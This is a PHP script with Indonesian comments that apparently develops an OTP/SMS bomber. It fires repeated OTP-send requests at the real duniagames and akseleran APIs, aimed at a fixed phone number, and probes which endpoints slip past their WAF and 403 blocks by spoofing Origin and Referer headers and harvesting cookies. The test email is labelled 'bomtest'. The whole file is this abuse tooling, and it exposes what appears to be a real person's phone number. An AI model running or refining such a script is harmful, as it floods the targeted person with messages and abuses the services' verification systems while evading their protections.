<?php
// Ronde 9: uji hipotesis "blokir duniagames per-path" + akseleran /api/v1/otp (403, mungkin butuh cookie/origin)
$UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Mobile Safari/537.36';
$L = '083822461998'; $P = '6283822461998'; $N = '83822461998';
$DG = ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
       'Origin: https://duniagames.co.id', 'Referer: https://duniagames.co.id/'];

$REQS = [
  // --- duniagames: mana path yang lolos WAF? ---
  ['name' => 'dg-resend-min', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/resend-otp',
   'h' => $DG, 'b' => '{"phoneNumber":"' . $L . '","authId":"1"}'],
  ['name' => 'dg-send-email', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
   'h' => $DG, 'b' => '{"email":"bomtest' . random_int(100000, 999999) . '@gmail.com"}'],
  ['name' => 'dg-send-phone', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
   'h' => array_merge($DG, ['ciam-type: FR', 'x-device: 1b5707e3-7789-4a46-b55a-a0c7eddf91c5']),
   'b' => '{"phoneNumber":"' . $L . '"}'],
  ['name' => 'dg-get-resend', 'm' => 'GET', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/resend-otp',
   'h' => $DG, 'b' => ''],
  ['name' => 'dg-get-send', 'm' => 'GET', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
   'h' => $DG, 'b' => ''],
  ['name' => 'dg-old-reqotp', 'm' => 'POST', 'url' => 'https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',
   'h' => $DG, 'b' => '{"phoneNumber":"' . $L . '","inquiryId":"219424679"}'],
  ['name' => 'dg-v2user-root', 'm' => 'GET', 'url' => 'https://api.duniagames.co.id/api/user/api/v2/user/resend-otp/',
   'h' => $DG, 'b' => ''],

  // --- akseleran /api/v1/otp/request: 403 "Access Forbidden", coba header browser + cookie situs ---
  ['name' => 'aksel-otp-browser', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/api/v1/otp/request',
   'h' => ['Content-Type: application/json', 'Accept: application/json, text/plain, */*',
           'Origin: https://www.akseleran.co.id', 'Referer: https://www.akseleran.co.id/', 'sec-fetch-site: same-site'],
   'b' => '{"phone_number":"' . $L . '"}', 'cookies' => 'https://www.akseleran.co.id/'],
  ['name' => 'aksel-otp-form', 'm' => 'POST', 'url' => 'https://api.akseleran.co.id/api/v1/otp/request',
   'h' => ['Content-Type: application/x-www-form-urlencoded', 'Origin: https://www.akseleran.co.id',
           'Referer: https://www.akseleran.co.id/'],
   'b' => 'phone_number=' . $L],
  ['name' => 'aksel-otp-get', 'm' => 'GET', 'url' => 'https://api.akseleran.co.id/api/v1/otp/request',
   'h' => ['Accept: application/json', 'Origin: https://www.akseleran.co.id', 'Referer: https://www.akseleran.co.id/'],
   'b' => '', 'cookies' => 'https://www.akseleran.co.id/'],
  ['name' => 'aksel-v1-root', 'm' => 'GET', 'url' => 'https://api.akseleran.co.id/api/v1/',
   'h' => ['Accept: application/json'], 'b' => ''],
];

function do_request($r, $UA) {
  $ch = curl_init();
  $hdrs = $r['h']; $hdrs[] = 'User-Agent: ' . $UA; $hdrs[] = 'Accept-Language: id,en;q=0.9';
  $cookie = '';
  if (!empty($r['cookies'])) {
    curl_setopt_array($ch, [CURLOPT_URL => $r['cookies'], CURLOPT_RETURNTRANSFER => true,
      CURLOPT_HEADER => true, CURLOPT_TIMEOUT => 20, CURLOPT_FOLLOWLOCATION => true]);
    $h = curl_exec($ch);
    foreach (explode("\r\n", $h) as $line)
      if (stripos($line, 'set-cookie:') === 0) $cookie .= substr($line, 13) . '; ';
    curl_close($ch);
    $cookie = trim($cookie, '; ');
    if ($cookie !== '') $hdrs[] = 'Cookie: ' . explode(';', $cookie)[0];
  }
  curl_setopt_array($ch, [CURLOPT_URL => $r['url'], CURLOPT_HTTPHEADER => $hdrs, CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10, CURLOPT_TIMEOUT => 35, CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING => '', CURLOPT_CUSTOMREQUEST => $r['m']]);
  if ($r['m'] !== 'GET') curl_setopt($ch, CURLOPT_POSTFIELDS, $r['b']);
  $body = curl_exec($ch);
  $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
  $err = curl_error($ch);
  curl_close($ch);
  $flat = trim(preg_replace('/\s+/', ' ', (string) $body));
  if (preg_match('/^\s*<(!doctype|html)/i', $flat)) {
    $t = '';
    if (preg_match('/<title>(.*?)<\/title>/is', $flat, $mm)) $t = 'title=' . trim($mm[1]);
    $flat = '(html) ' . ($t !== '' ? $t : substr($flat, 0, 60));
  }
  printf("%-18s [%-3s] %s\n", $r['name'], $code ?: '000',
    $err !== '' ? 'GAGAL: ' . $err : ($flat !== '' ? substr($flat, 0, 210) : '(kosong)'));
}

foreach ($REQS as $r) { do_request($r, $UA); usleep(400000); }
echo "\n";
